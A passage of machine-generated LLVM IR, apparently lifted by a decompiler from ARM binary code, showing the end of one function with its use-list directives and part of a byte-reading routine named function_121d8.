  %v5_120c4 = icmp slt i32 %v4_120c4, 0
  store i1 %v5_120c4, i1* %cpsr_v.global-to-local, align 1
  %v6_120c4 = icmp slt i32 %v1_120c4, 0
  store i1 %v6_120c4, i1* %cpsr_n.global-to-local, align 1
  %v7_120c4 = icmp eq i32 %v1_120c0, 3
  store i1 %v7_120c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_120bc, i32* %r4.global-to-local, align 4
  %v7_120cc = icmp slt i32 %v1_120c0, 4
  br i1 %v7_120cc, label %dec_label_pc_120a0, label %dec_label_pc_120d0

dec_label_pc_120d0:                               ; preds = %dec_label_pc_120a0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_120d0 = icmp slt i32 %v0_120bc, 0
  store i1 %v1_120d0, i1* %cpsr_n.global-to-local, align 1
  %v2_120d0 = icmp eq i32 %v0_120bc, 0
  store i1 %v2_120d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_120d0, label %dec_label_pc_120d8, label %dec_label_pc_120a0

dec_label_pc_120d8:                               ; preds = %dec_label_pc_120d0
  %v0_120d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_120d8 = add i32 %v0_120d8, -1
  store i32 %v1_120d8, i32* %r3.global-to-local, align 4
  %v0_120dc = load i32, i32* %sl.global-to-local, align 4
  %v1_120dc = trunc i32 %v0_120dc to i8
  %v4_120dc = inttoptr i32 %v1_120d8 to i8*
  store i8 %v1_120dc, i8* %v4_120dc, align 1
  %v0_120e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_120e0 = add i32 %v0_120e0, -1
  store i32 %v1_120e0, i32* %r2.global-to-local, align 4
  %v0_120e4 = load i32, i32* %r8.global-to-local, align 4
  %v1_120e4 = trunc i32 %v0_120e4 to i8
  %v4_120e4 = inttoptr i32 %v1_120e0 to i8*
  store i8 %v1_120e4, i8* %v4_120e4, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_120ec = load i32, i32* %r6.global-to-local, align 4
  %v1_120ec = inttoptr i32 %v0_120ec to i32*
  store i32 112, i32* %v1_120ec, align 4
  %v3_120ec = add i32 %v0_120ec, 4
  %v4_120ec = inttoptr i32 %v3_120ec to i32*
  %v5_120ec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_120ec, i32* %v4_120ec, align 4
  %v0_120f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_120f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_120f0 = add i32 %v1_120f0, 8
  %v3_120f0 = inttoptr i32 %v2_120f0 to i32*
  store i32 %v0_120f0, i32* %v3_120f0, align 4
  %v0_120f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_120f4 = add i32 %v0_120f4, 12
  store i32 %v1_120f4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_120f8

dec_label_pc_120f8:                               ; preds = %dec_label_pc_12070, %.thread102, %dec_label_pc_120d8
  %v1_12104.pre = phi i32 [ %v2_11c70, %.thread102 ], [ %v1_120f4, %dec_label_pc_120d8 ], [ %v1_12104.pre.pre, %dec_label_pc_12070 ]
  %v2_120f8 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_120f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_120fc

dec_label_pc_120fc:                               ; preds = %dec_label_pc_120fc, %dec_label_pc_120f8
  %v0_120fc = phi i32 [ %v2_120f8, %dec_label_pc_120f8 ], [ %v4_120fc, %dec_label_pc_120fc ]
  %stack_var_-188.0 = phi i32 [ %v3_11ba8, %dec_label_pc_120f8 ], [ %v2_12108, %dec_label_pc_120fc ]
  %v1_120fc = inttoptr i32 %v0_120fc to i32*
  %v2_120fc = load i32, i32* %v1_120fc, align 4
  store i32 %v2_120fc, i32* %r3.global-to-local, align 4
  %v4_120fc = add i32 %v0_120fc, 12
  store i32 %v4_120fc, i32* %r2.global-to-local, align 4
  %v3_12104 = icmp ult i32 %v4_120fc, %v1_12104.pre
  %v2_12108 = sub i32 %stack_var_-188.0, %v2_120fc
  store i32 %v2_12108, i32* %ip.global-to-local, align 4
  br i1 %v3_12104, label %dec_label_pc_120fc, label %dec_label_pc_12114

dec_label_pc_12114:                               ; preds = %dec_label_pc_120fc
  %v3_12114 = load i8, i8* %stack_var_-50, align 1
  %v4_12114 = sext i8 %v3_12114 to i32
  store i32 %v4_12114, i32* %r3.global-to-local, align 4
  store i32 %v4_12114, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_12118 = icmp slt i8 %v3_12114, 0
  store i1 %v1_12118, i1* %cpsr_n.global-to-local, align 1
  %v2_12118 = icmp eq i8 %v3_12114, 0
  store i1 %v2_12118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12118, label %bb223, label %bb222

bb222:                                            ; preds = %dec_label_pc_12114
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_12114, %bb222
  %v1_12164 = phi i32 [ %v4_12114, %dec_label_pc_12114 ], [ 1, %bb222 ]
  %v2_12120 = sub i32 %v2_12108, %v1_12164
  store i32 %v2_12120, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_12128 = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_12128, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1212c = icmp slt i32 %v2_12120, 0
  store i1 %v1_1212c, i1* %cpsr_n.global-to-local, align 1
  %v2_1212c = icmp eq i32 %v2_12120, 0
  store i1 %v2_1212c, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp224 = icmp slt i32 %v2_12120, 1
  br i1 %tmp224, label %dec_label_pc_1218c, label %dec_label_pc_12140

dec_label_pc_12140:                               ; preds = %bb223
  %v0_12140 = load i32, i32* %fp.global-to-local, align 4
  %v1_12140 = add i32 %v0_12140, 12
  %v2_12140 = inttoptr i32 %v1_12140 to i32*
  %v3_12140 = load i32, i32* %v2_12140, align 4
  store i32 %v3_12140, i32* %r3.global-to-local, align 4
  %v1_12144 = and i32 %v3_12140, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12144 = icmp eq i32 %v1_12144, 0
  store i1 %v2_12144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12144, label %dec_label_pc_1215c, label %dec_label_pc_1214c

dec_label_pc_1214c:                               ; preds = %dec_label_pc_12140
  store i32 ptrtoint (i32* @global_var_17497.550 to i32), i32* %r3.global-to-local, align 4
  %v1_12150 = add i32 %v1_12104.pre, 12
  store i32 %v1_12150, i32* %r5.global-to-local, align 4
  %v1_12154 = inttoptr i32 %v1_12104.pre to i32*
  store i32 160, i32* %v1_12154, align 4
  %v3_12154 = add i32 %v1_12104.pre, 4
  %v4_12154 = inttoptr i32 %v3_12154 to i32*
  %v5_12154 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_12154, i32* %v4_12154, align 4
  %v6_12154 = add i32 %v1_12104.pre, 8
  %v7_12154 = inttoptr i32 %v6_12154 to i32*
  %v8_12154 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_12154, i32* %v7_12154, align 4
  br label %dec_label_pc_12190

dec_label_pc_1215c:                               ; preds = %dec_label_pc_12140
  %v1_1215c = add i32 %v0_12140, 16
  %v2_1215c = inttoptr i32 %v1_1215c to i32*
  %v3_1215c = load i32, i32* %v2_1215c, align 4
  store i32 %v3_1215c, i32* %r3.global-to-local, align 4
  %v1_12160 = add i32 %v3_1215c, -48
  %v3_12160 = sub i32 47, %v3_1215c
  %v4_12160 = and i32 %v3_12160, %v3_1215c
  %v5_12160 = icmp slt i32 %v4_12160, 0
  store i1 %v5_12160, i1* %cpsr_v.global-to-local, align 1
  %v6_12160 = icmp slt i32 %v1_12160, 0
  store i1 %v6_12160, i1* %cpsr_n.global-to-local, align 1
  %v7_12160 = icmp eq i32 %v3_1215c, 48
  store i1 %v7_12160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12160, label %dec_label_pc_12170, label %bb225

bb225:                                            ; preds = %dec_label_pc_1215c
  store i32 %v2_12108, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1218c

dec_label_pc_12170:                               ; preds = %dec_label_pc_1215c
  %v3_12170 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_12104.pre, i32* %r5.global-to-local, align 4
  %v2_12178 = add i32 %v3_12170, %v2_12120
  store i32 %v2_12178, i32* %r3.global-to-local, align 4
  store i32 %v2_12178, i32* %stack_var_-168, align 4
  br label %dec_label_pc_12190

dec_label_pc_12184:                               ; preds = %dec_label_pc_12198
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_121c8

dec_label_pc_1218c:                               ; preds = %bb225, %bb223
  store i32 %v1_12104.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12190

dec_label_pc_12190:                               ; preds = %dec_label_pc_12170, %dec_label_pc_1214c, %dec_label_pc_1218c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_11b84, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12198

dec_label_pc_12198:                               ; preds = %dec_label_pc_121c0, %dec_label_pc_12190
  %v0_12198 = phi i32 [ %v1_121b8, %dec_label_pc_121c0 ], [ %v2_11b84, %dec_label_pc_12190 ]
  %v1_12198 = inttoptr i32 %v0_12198 to i32*
  %v2_12198 = load i32, i32* %v1_12198, align 4
  store i32 %v2_12198, i32* %r1.global-to-local, align 4
  %v3_12198 = add i32 %v0_12198, 4
  %v4_12198 = inttoptr i32 %v3_12198 to i32*
  %v5_12198 = load i32, i32* %v4_12198, align 4
  store i32 %v5_12198, i32* %r2.global-to-local, align 4
  %v6_12198 = add i32 %v0_12198, 8
  %v7_12198 = inttoptr i32 %v6_12198 to i32*
  %v8_12198 = load i32, i32* %v7_12198, align 4
  store i32 %v8_12198, i32* %r3.global-to-local, align 4
  %v2_1219c = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_1219c, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 74156, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_121ac = load i32, i32* %r4.global-to-local, align 4
  %v1_121ac = add i32 %v0_121ac, 4
  %v2_121ac = inttoptr i32 %v1_121ac to i32*
  %v3_121ac = load i32, i32* %v2_121ac, align 4
  store i32 %v3_121ac, i32* %r3.global-to-local, align 4
  %v0_121b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_121b0 = sub i32 %v0_121b0, %v3_121ac
  %v4_121b0 = xor i32 %v0_121b0, %v3_121ac
  %v5_121b0 = xor i32 %v2_121b0, %v0_121b0
  %v6_121b0 = and i32 %v5_121b0, %v4_121b0
  %v7_121b0 = icmp slt i32 %v6_121b0, 0
  store i1 %v7_121b0, i1* %cpsr_v.global-to-local, align 1
  %v8_121b0 = icmp slt i32 %v2_121b0, 0
  store i1 %v8_121b0, i1* %cpsr_n.global-to-local, align 1
  %v9_121b0 = icmp eq i32 %v0_121b0, %v3_121ac
  store i1 %v9_121b0, i1* %cpsr_z.global-to-local, align 1
  %v0_121b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_121b4 = add i32 %v0_121b4, %v0_121b0
  store i32 %v2_121b4, i32* %r6.global-to-local, align 4
  %v1_121b8 = add i32 %v0_121ac, 12
  store i32 %v1_121b8, i32* %r4.global-to-local, align 4
  br i1 %v9_121b0, label %dec_label_pc_121c0, label %dec_label_pc_12184

dec_label_pc_121c0:                               ; preds = %dec_label_pc_12198
  %v1_121c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_121c0 = sub i32 %v1_121b8, %v1_121c0
  %v3_121c0 = icmp ult i32 %v1_121b8, %v1_121c0
  %v4_121c0 = xor i32 %v1_121c0, %v1_121b8
  %v5_121c0 = xor i32 %v2_121c0, %v1_121b8
  %v6_121c0 = and i32 %v5_121c0, %v4_121c0
  %v7_121c0 = icmp slt i32 %v6_121c0, 0
  store i1 %v7_121c0, i1* %cpsr_v.global-to-local, align 1
  %v8_121c0 = icmp slt i32 %v2_121c0, 0
  store i1 %v8_121c0, i1* %cpsr_n.global-to-local, align 1
  %v9_121c0 = icmp eq i32 %v1_121b8, %v1_121c0
  store i1 %v9_121c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_121c0, label %dec_label_pc_12198, label %dec_label_pc_121c8

dec_label_pc_121c8:                               ; preds = %dec_label_pc_121c0, %dec_label_pc_12184
  %v0_121c8 = phi i32 [ -1, %dec_label_pc_12184 ], [ %v2_121b4, %dec_label_pc_121c0 ]
  store i32 %v0_121c8, i32* %r0.global-to-local, align 4
  %v8_121d4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_121d4, i32* @r6, align 4
  store i32 %v6_11b70, i32* @r7, align 4
  store i32 %v9_11b70, i32* @r8, align 4
  store i32 %v12_11b70, i32* @sb, align 4
  store i32 %v15_11b70, i32* @sl, align 4
  store i32 %v18_11b70, i32* @fp, align 4
  ret i32 %v0_121c8

; uselistorder directives
  uselistorder i32 %v0_121c8, { 1, 0 }
  uselistorder i32 %v2_121c0, { 1, 0 }
  uselistorder i32 %v1_121c0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_121b8, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_121b0, { 1, 0 }
  uselistorder i32 %v0_121b0, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_121ac, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12198, { 2, 1, 0 }
  uselistorder i32 %v3_1215c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_12108, { 0, 1, 3, 2 }
  uselistorder i32 %v4_120fc, { 1, 2, 0 }
  uselistorder i32 %v0_120fc, { 1, 0 }
  uselistorder i32 %v1_12104.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_120bc, { 3, 4, 2, 5, 1, 0 }
  uselistorder i32 %v0_120a0, { 1, 0 }
  uselistorder i32 %storemerge137, { 1, 0 }
  uselistorder i32 %v0_1207c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_12070, { 3, 0, 1, 2 }
  uselistorder i32 %v2_1204c, { 1, 0 }
  uselistorder i32 %v1_1204c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12048, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_12040, { 1, 0 }
  uselistorder i32 %v0_12038, { 3, 0, 1, 2 }
  uselistorder i32 %v0_12020, { 1, 0 }
  uselistorder i32 %v1_11ffc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11ffc, { 1, 0, 2 }
  uselistorder i32 %v1_11fd8, { 0, 2, 1 }
  uselistorder i32 %v0_11fd4, { 3, 0, 1, 2 }
  uselistorder i1 %v2_11fb8, { 2, 1, 0 }
  uselistorder i32 %v2_11f10, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_11f00, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_11fa4, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_11eac, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_11e94, { 1, 0 }
  uselistorder i32 %v2_11e8c, { 1, 2, 0 }
  uselistorder i32 %v1_11e80, { 1, 0 }
  uselistorder i32 %v0_11e80, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_11e78, { 1, 0, 2 }
  uselistorder i32 %v0_11e70, { 3, 0, 1, 2 }
  uselistorder i1 %v3_11e54, { 1, 0 }
  uselistorder i32 %v2_11e54, { 1, 0 }
  uselistorder i32 %v2_11e50, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_11e3c, { 1, 0 }
  uselistorder i32 %v1_11e40, { 2, 1, 0 }
  uselistorder i1 %v2_11e30, { 1, 0 }
  uselistorder i32 %v0_11e2c, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_11e14, { 1, 0 }
  uselistorder i32 %v1_11e08, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_11dc0, { 1, 2, 0 }
  uselistorder i32 %v2_11dbc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11dbc, { 1, 0, 2 }
  uselistorder i1 %v2_11da8, { 1, 0 }
  uselistorder i32 %v0_11da0, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_11db0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_11d90, { 1, 0 }
  uselistorder i32 %v0_11d80, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_11d78, { 1, 0 }
  uselistorder i1 %v5_11d78, { 1, 0 }
  uselistorder i32 %v0_11d74, { 0, 2, 1, 3 }
  uselistorder i32 %v0_11d68, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v0_11d64, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v0_11d40, { 1, 0 }
  uselistorder i32 %v4_11d18, { 1, 0 }
  uselistorder i32 %v3_11d18, { 1, 0 }
  uselistorder i32 %v0_11c4c, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_11b80, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 4, 3, 5, 0, 6, 7, 8, 9 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 7, 8, 9, 6, 10, 4, 11, 12, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 43, 26, 27, 31, 28, 29, 30, 32, 53, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 1, 44, 45, 52, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 8, 9, 10, 5, 6, 7, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 17, 14, 16, 18, 7, 8, 15, 9, 10, 11, 13, 12, 19, 20, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 10, 8, 9, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 27, 28, 29, 2, 30, 31, 32, 33, 34, 1, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 26, 27, 28, 29, 2, 30, 31, 32, 33, 1, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 27, 28, 29, 30, 2, 31, 32, 33, 34, 1, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6 }
  uselistorder i8 69, { 0, 2, 3, 1 }
  uselistorder i32 96, { 1, 2, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_12190, { 2, 0, 1 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_120f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12070, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12048, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_12020, { 1, 0 }
  uselistorder label %dec_label_pc_11ffc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11fe0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11fb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11fb0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11ed4, { 1, 0 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_11ec4, { 1, 0 }
  uselistorder label %dec_label_pc_11eb8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb204, { 1, 0 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb199, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb194, { 1, 0 }
  uselistorder label %dec_label_pc_11de0, { 2, 0, 1 }
  uselistorder label %bb191, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %.thread102, { 1, 0 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %bb179, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
}

define i32 @function_121d8(i8* %arg1) local_unnamed_addr {
dec_label_pc_121d8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_121d8 = load i32, i32* @r4, align 4
  store i32 %v3_121d8, i32* %stack_var_-8, align 4
  %v0_121dc = load i32, i32* @r0, align 4
  %v1_121dc = add i32 %v0_121dc, 16
  %v2_121dc = inttoptr i32 %v1_121dc to i32*
  %v3_121dc = load i32, i32* %v2_121dc, align 4
  store i32 %v3_121dc, i32* %r2.global-to-local, align 4
  %v1_121e0 = add i32 %v0_121dc, 24
  %v2_121e0 = inttoptr i32 %v1_121e0 to i32*
  %v3_121e0 = load i32, i32* %v2_121e0, align 4
  %v3_121e4 = icmp ult i32 %v3_121dc, %v3_121e0
  store i32 %v0_121dc, i32* @r4, align 4
  br i1 %v3_121e4, label %bb, label %dec_label_pc_121fc

bb:                                               ; preds = %dec_label_pc_121d8
  %v2_121ec = inttoptr i32 %v3_121dc to i8*
  %v3_121ec = load i8, i8* %v2_121ec, align 1
  %v4_121ec = zext i8 %v3_121ec to i32
  store i32 %v4_121ec, i32* %r0.global-to-local, align 4
  %v6_121ec = add i32 %v3_121dc, 1
  store i32 %v6_121ec, i32* %r2.global-to-local, align 4
  store i32 %v6_121ec, i32* %v2_121dc, align 4
  br label %dec_label_pc_122fc

dec_label_pc_121fc:                               ; preds = %dec_label_pc_121d8
  %v1_121fc = inttoptr i32 %v0_121dc to i8*
  %v2_121fc = load i8, i8* %v1_121fc, align 1
  %v3_121fc = zext i8 %v2_121fc to i32
  %v1_12200 = and i32 %v3_121fc, 131
  %tmp22 = icmp ugt i32 %v1_12200, 128
  br i1 %tmp22, label %dec_label_pc_1221c, label %dec_label_pc_1220c

dec_label_pc_1220c:                               ; preds = %dec_label_pc_121fc
  store i32 128, i32* @r1, align 4
  %v0_12210 = call i32 @function_13a60()
  store i32 %v0_12210, i32* %r0.global-to-local, align 4
  %v2_12214 = icmp eq i32 %v0_12210, 0
  br i1 %v2_12214, label %dec_label_pc_1220c.dec_label_pc_1221c_crit_edge, label %dec_label_pc_122f8

dec_label_pc_1220c.dec_label_pc_1221c_crit_edge:  ; preds = %dec_label_pc_1220c
  %v0_1221c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1221c

dec_label_pc_1221c:                               ; preds = %dec_label_pc_1220c.dec_label_pc_1221c_crit_edge, %dec_label_pc_121fc
  %v2_12268 = phi i32 [ %v0_1221c.pre, %dec_label_pc_1220c.dec_label_pc_1221c_crit_edge ], [ %v0_121dc, %dec_label_pc_121fc ]
  %v1_1221c = inttoptr i32 %v2_12268 to i8*
  %v2_1221c = load i8, i8* %v1_1221c, align 1
  %v3_1221c = zext i8 %v2_1221c to i32
  store i32 %v3_1221c, i32* %r2.global-to-local, align 4
  %v1_12220 = add i32 %v2_12268, 1
  %v2_12220 = inttoptr i32 %v1_12220 to i8*
  %v3_12220 = load i8, i8* %v2_12220, align 1
  %v4_12220 = zext i8 %v3_12220 to i32
  %v4_12224 = mul nuw nsw i32 %v4_12220, 256
  %v5_12224 = or i32 %v4_12224, %v3_1221c
  store i32 %v5_12224, i32* %r2.global-to-local, align 4
  %v1_12228 = and i32 %v3_1221c, 2
  %v2_12228 = icmp eq i32 %v1_12228, 0
  br i1 %v2_12228, label %dec_label_pc_12258, label %dec_label_pc_12230

dec_label_pc_12230:                               ; preds = %dec_label_pc_1221c
  %tmp23 = urem i8 %v2_1221c, 2
  %v1_12230 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_12230
  %v4_12234 = and i32 %tmp18, 4
  %v5_12234 = add i32 %v4_12234, %v2_12268
  %v1_12238 = add i32 %v5_12234, 36
  %v2_12238 = inttoptr i32 %v1_12238 to i8*
  %v3_12238 = load i8, i8* %v2_12238, align 1
  %v4_12238 = zext i8 %v3_12238 to i32
  %v1_1223c = add nsw i32 %v5_12224, -1
  store i32 %v1_1223c, i32* %r2.global-to-local, align 4
  %v3_12240 = sdiv i32 %v1_1223c, 256
  store i32 %v3_12240, i32* %r1.global-to-local, align 4
  store i32 %v4_12238, i32* %r0.global-to-local, align 4
  %v2_1224c = add i32 %v2_12268, 40
  %v3_1224c = inttoptr i32 %v2_1224c to i32*
  store i32 0, i32* %v3_1224c, align 4
  %v0_12250 = load i32, i32* %r1.global-to-local, align 4
  %v1_12250 = trunc i32 %v0_12250 to i8
  %v2_12250 = load i32, i32* @r4, align 4
  %v3_12250 = add i32 %v2_12250, 1
  %v4_12250 = inttoptr i32 %v3_12250 to i8*
  store i8 %v1_12250, i8* %v4_12250, align 1
  br label %dec_label_pc_1228c

dec_label_pc_12258:                               ; preds = %dec_label_pc_1221c
  %v1_12258 = add i32 %v2_12268, 16
  store i32 %v1_12258, i32* %r1.global-to-local, align 4
  %v1_1225c = inttoptr i32 %v1_12258 to i32*
  %v2_1225c = load i32, i32* %v1_1225c, align 4
  store i32 %v2_1225c, i32* %r1.global-to-local, align 4
  %v3_1225c = add i32 %v2_12268, 20
  %v4_1225c = inttoptr i32 %v3_1225c to i32*
  %v5_1225c = load i32, i32* %v4_1225c, align 4
  %v9_12260 = icmp eq i32 %v5_1225c, %v2_1225c
  br i1 %v9_12260, label %dec_label_pc_12270, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12258
  %v2_12264 = inttoptr i32 %v2_1225c to i8*
  %v3_12264 = load i8, i8* %v2_12264, align 1
  %v4_12264 = zext i8 %v3_12264 to i32
  store i32 %v4_12264, i32* %r0.global-to-local, align 4
  %v6_12264 = add i32 %v2_1225c, 1
  store i32 %v6_12264, i32* %r1.global-to-local, align 4
  store i32 %v6_12264, i32* %v1_1225c, align 4
  br label %dec_label_pc_122fc

dec_label_pc_12270:                               ; preds = %dec_label_pc_12258
  %v1_12270 = add i32 %v2_12268, 4
  %v2_12270 = inttoptr i32 %v1_12270 to i32*
  %v3_12270 = load i32, i32* %v2_12270, align 4
  %v4_12278 = icmp eq i32 %v3_12270, -2
  br i1 %v4_12278, label %dec_label_pc_1227c, label %dec_label_pc_12294

dec_label_pc_1227c:                               ; preds = %dec_label_pc_12270
  %v1_1227c = or i32 %v5_12224, 4
  store i32 %v1_1227c, i32* %r2.global-to-local, align 4
  store i8 %v3_12220, i8* %v2_12220, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1228c

dec_label_pc_1228c:                               ; preds = %dec_label_pc_12230, %dec_label_pc_1227c
  %v0_1228c = load i32, i32* %r2.global-to-local, align 4
  %v1_1228c = trunc i32 %v0_1228c to i8
  %v2_1228c = load i32, i32* @r4, align 4
  %v3_1228c = inttoptr i32 %v2_1228c to i8*
  store i8 %v1_1228c, i8* %v3_1228c, align 1
  br label %dec_label_pc_122fc

dec_label_pc_12294:                               ; preds = %dec_label_pc_12270
  %v1_12294 = and i32 %v4_12224, 768
  %v2_12294 = icmp eq i32 %v1_12294, 0
